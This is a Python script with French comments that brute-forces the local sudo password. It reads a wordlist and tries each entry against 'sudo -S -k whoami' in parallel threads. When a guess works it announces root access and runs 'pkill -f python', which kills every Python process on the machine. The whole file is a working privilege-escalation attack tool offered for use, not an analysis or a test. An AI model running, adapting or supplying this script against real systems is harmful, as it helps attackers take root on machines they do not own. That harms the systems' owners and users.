import pexpect
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import multiprocessing
import threading
import signal
import sys

# Variables globales pour le contrôle des threads
password_found = threading.Event()
found_password = None
password_lock = threading.Lock()

def test_password(pw, index):
    # Vérifier si un mot de passe a déjà été trouvé
    if password_found.is_set():
        return None

    print(f"[{index}] Test mot de passe: {pw}")
    child = None
    
    try:
        child = pexpect.spawn("sudo -S -k whoami", encoding="utf-8")
        child.sendline(pw)
        child.expect([pexpect.TIMEOUT, "root", pexpect.EOF], timeout=0.1)
        
        if child.after == "root":
            with password_lock:
                # Double vérification pour éviter les races conditions
                if not password_found.is_set():
                    password_found.set()
                    global found_password
                    found_password = pw
                    
                    print(f"✅ Mot de passe trouvé : {pw} [{index}]")
                    print("\033[91m🐚 VOUS ÊTES MAINTENANT ROOT !\033[0m")
                    print("\033[92m🚀 Tapez simplement 'sudo su' !\033[0m")
                    
                    # Arrêter tous les processus Python
                    os.system("pkill -f python 2>/dev/null")
                    return pw
                    
    except Exception as e:
        # Ignorer les erreurs normales de timeout
        if "Timeout" not in str(e):
            pass
    finally:
        if child and child.isalive():
            try:
                child.close()
            except:
                pass
    
    return None

def signal_handler(sig, frame):
    """Gérer l'arrêt propre avec Ctrl+C"""
    print("\n⏹️  Arrêt demandé...")
    password_found.set()
    sys.exit(0)

def main():
    # Enregistrer le gestionnaire de signal pour Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = argparse.ArgumentParser(description="Bruteforce sudo using a wordlist.")
    parser.add_argument("--wordlist", required=True, help="Chemin vers le fichier wordlist")
    args = parser.parse_args()

    # Vérifier que le fichier existe
    if not os.path.exists(args.wordlist):
        print(f"❌ Fichier {args.wordlist} non trouvé")
        return

    try:
        with open(args.wordlist, "r", encoding="latin-1", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"❌ Erreur lors de la lecture du fichier: {e}")
        return

    if not passwords:
        print("❌ Aucun mot de passe dans le fichier wordlist")
        return

    print(f"🔍 Début du bruteforce avec {len(passwords)} mots de passe...")
    print("💡 Appuyez sur Ctrl+C pour arrêter\n")

    max_workers = min(multiprocessing.cpu_count() * 2, 16)  # Limiter à 16 max
    success = False

    try:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Soumettre toutes les tâches
            future_to_password = {
                executor.submit(test_password, pw, i+1): (pw, i+1) 
                for i, pw in enumerate(passwords)
            }
            
            # Traiter les résultats au fur et à mesure
            for future in as_completed(future_to_password):
                if password_found.is_set():
                    # Annuler les tâches restantes
                    executor.shutdown(wait=False, cancel_futures=True)
                    success = True
                    break
                    
                result = future.result()
                if result:
                    success = True
                    break
                    
    except KeyboardInterrupt:
        print("\n⏹️  Arrêt demandé par l'utilisateur")
        password_found.set()
    except Exception as e:
        print(f"❌ Erreur inattendue: {e}")

    if not success:
        print("❌ Aucun mot de passe trouvé.")

if __name__ == "__main__":
    main()
